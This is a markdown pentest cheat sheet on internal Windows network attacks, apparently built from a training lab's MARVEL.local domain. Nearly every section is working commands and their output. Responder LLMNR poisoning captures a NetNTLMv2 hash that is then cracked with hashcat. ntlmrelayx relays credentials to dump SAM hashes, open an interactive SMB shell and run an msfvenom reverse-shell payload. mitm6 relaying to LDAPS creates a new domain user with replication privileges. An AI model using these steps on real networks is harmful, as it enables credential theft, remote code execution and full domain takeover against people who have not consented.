# Internal

- [LLMNR](#llmnr)
- [SMB Relay Attack](#smb-relay-attack)
- [MITM6](#mitm6)
- [Links](#links)



## LLMNR

LLMNR Poisoning (Link-Local Multicast Name Resolution) with Responder

Verifica PRIMA quali servizi potrebbero dare "problemi"

```
-r, --wredir          Enable answers for netbios wredir suffix queries.
                        Answering to wredir will likely break stuff on the
                        network. Default: False
-d, --NBTNSdomain     Enable answers for netbios domain suffix queries.
                        Answering to domain suffixes will likely break stuff
                        on the network. Default: False
```

```
vi /etc/responder/Responder.conf

root@kali:/opt/impacket# grep -i http /etc/responder/Responder.conf
HTTP = Off
HTTPS = Off
```

example attack

```
root@junkie:/opt/Responder# python Responder.py -I enp0s9 -rdwv
```

and we grab hash

```
fcastle::MARVEL:e8c1a1f3953b8853:F72AE12A045EF2EC9054A63A8FFB9ECF:01010000000000007DE3B517AF92D601334C8CB4CB2CBFE70000000002000A005200440050003100320001000A005200440050003100320004000A005200440050003100320003000A005200500044003100320005000A00520044005000310032000800300030000000000000000100000000200000691A458F98BF1BCC5E6EC8364ACF3A37794FA39A18A3F435902A33D6E61BF7B60A0010000000000000000000000000000000000009002A005400450052004D005300520056002F003100390032002E003100360038002E00380038002E00310030000000000000000000

hashcat -m 5600 hashes.txt rockyou.txt
```

hashes are also stored in:

/usr/share/responder/logs
 

## SMB Relay Attack

requirements

- SMB signing must be disabled on target
- relayed user credentials must be admin on the target machine

to find vulnerable hosts:

```
nmap --script=smb2-security-mode -p445 192.168.1.0/24 --open
```

write IPs in text file.

we need to turn off smb and http on responder:

```
root@kali:~# egrep -i '(smb|http)' /etc/responder/Responder.conf
root@kali:~# egrep -i '(smb|http)' /etc/responder/Responder.conf
SMB = Off
HTTP = Off
HTTPS = Off
```

start responder

start ntlmrelayx

```
ntlmrelayx.py -tf targets.txt -smb2support
```

wait...

to "speed up" result, you can browse \IP_TARGET


```
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x0e4275d7260558766159ed57c60d5354
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:08f94cb392028fe6240c50c314fb913c:::
Peter Parker:1002:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
```

to get a shell on target, we use -i parameter:

```
ntlmrelayx.py -tf targets.txt -smb2support -i
```

message will be:

```
[*] Servers started, waiting for connections
[*] Setting up HTTP Server
[*] SMBD-Thread-3: Connection from MARVEL/ADMINISTRATOR@192.168.88.3 controlled, attacking target smb://192.168.88.4
[*] Authenticating against smb://192.168.88.4 as MARVEL/ADMINISTRATOR SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[*] SMBD-Thread-3: Connection from MARVEL/ADMINISTRATOR@192.168.88.3 controlled, but there are no more targets left!
[*] HTTPD: Received connection from 192.168.88.3, attacking target smb://192.168.88.4
[*] SMBD-Thread-6: Connection from MARVEL/ADMINISTRATOR@192.168.88.3 controlled, but there are no more targets left!
```

that means we got a shell on remote target, we can access with localhost and port 10000

```
root@kali:~# nc localhost 11000
Type help for list of commands
# help
```

to enumerate shares:

```
# shares
ADMIN$
C$
IPC$
Share
```

to access some share:

```
# use C$
# ls
drw-rw-rw-          0  Sat Jul 18 18:39:48 2020 $Recycle.Bin
drw-rw-rw-          0  Sat Jul 18 18:10:49 2020 $WinREAgent
drw-rw-rw-          0  Sat Jul 18 15:01:04 2020 Documents and Settings
-rw-rw-rw-       8192  Fri Sep 25 15:02:59 2020 DumpStack.log.tmp
-rw-rw-rw-  536870912  Fri Sep 25 15:02:59 2020 pagefile.sys
drw-rw-rw-          0  Sun Jul 19 00:53:11 2020 PerfLogs
drw-rw-rw-          0  Sat Jul 18 15:16:40 2020 Program Files
drw-rw-rw-          0  Sun Jul 19 00:53:11 2020 Program Files (x86)
drw-rw-rw-          0  Sat Jul 18 18:37:20 2020 ProgramData
drw-rw-rw-          0  Sat Jul 18 15:01:21 2020 Recovery
drw-rw-rw-          0  Sat Jul 18 18:35:26 2020 Share
-rw-rw-rw-  268435456  Fri Sep 25 15:02:59 2020 swapfile.sys
drw-rw-rw-          0  Sat Jul 18 15:01:47 2020 System Volume Information
drw-rw-rw-          0  Sat Jul 18 18:38:01 2020 Users
drw-rw-rw-          0  Mon Aug  3 11:55:23 2020 Windows
```

other hints:

```
ntlmrelayx.py -tf targets.txt -smb2support -e test.exe (dove test.exe Ã¨ una reverse shell fatta con msfvenom)

ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

## MITM6

installation

```
root@kali:/opt/tools# git clone https://github.com/fox-it/mitm6.git
root@kali:/opt/tools/mitm6# pip3 install .


root@kali:/opt/tools/mitm6# mitm6 -d marvel.local
```

(.88.2 is the domain controller)

```
root@kali:/opt/tools/mitm6# ntlmrelayx.py -6 -t ldaps://192.168.88.2 -wh fakewpad.marvel.local -l lootme
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[*] Protocol Client SMB loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
```

after rebooting a pc:

```
[*] Authenticating against ldaps://192.168.88.2 as MARVEL\fcastle SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from ::ffff:192.168.88.19, but there are no more targets left!
[*] Dumping domain info for first time
```

in /opt/tools/mitm6 folder we can find lots of information:

```
root@kali:/opt/tools/mitm6/lootme# ls -l
total 176
-rw-r--r-- 1 root root   844 Aug  2 15:57 domain_computers.grep
-rw-r--r-- 1 root root  1942 Aug  2 15:57 domain_computers.html
-rw-r--r-- 1 root root 11909 Aug  2 15:57 domain_computers.json
-rw-r--r-- 1 root root 10970 Aug  2 15:57 domain_groups.grep
-rw-r--r-- 1 root root 17114 Aug  2 15:57 domain_groups.html
-rw-r--r-- 1 root root 80259 Aug  2 15:57 domain_groups.json
-rw-r--r-- 1 root root  1154 Aug  2 15:57 domain_policy.html
-rw-r--r-- 1 root root  5323 Aug  2 15:57 domain_policy.json
-rw-r--r-- 1 root root  2333 Aug  2 15:57 domain_users.grep
-rw-r--r-- 1 root root  6520 Aug  2 15:57 domain_users.html
-rw-r--r-- 1 root root 17500 Aug  2 15:57 domain_users.json
```

when some admin log in, this script will run:

```
[*] Authenticating against ldaps://192.168.88.2 as MARVEL\Administrator SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains

ACE
AceType: {0}
AceFlags: {0}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x003`\xcc\x15R\x0f\xe3\xf9\xc8\xea\x89

..
..
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[*] Attempting to create user in: CN=Users,DC=MARVEL,DC=local
[*] Adding new user with username: OpvcpUyYqb and password: ~(%1e_N*DB6S8p~ result: OK
[*] Querying domain security descriptor
[*] Success! User OpvcpUyYqb now has Replication-Get-Changes-All privileges on the domain
```

(added user OpvcpUyYqb with administrator privileges)


## Links

https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/

https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa

https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/top-five-ways-spiderlabs-got-domain-admin-on-your-internal-network/

https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/

https://github.com/SecWiki/windows-kernel-exploits
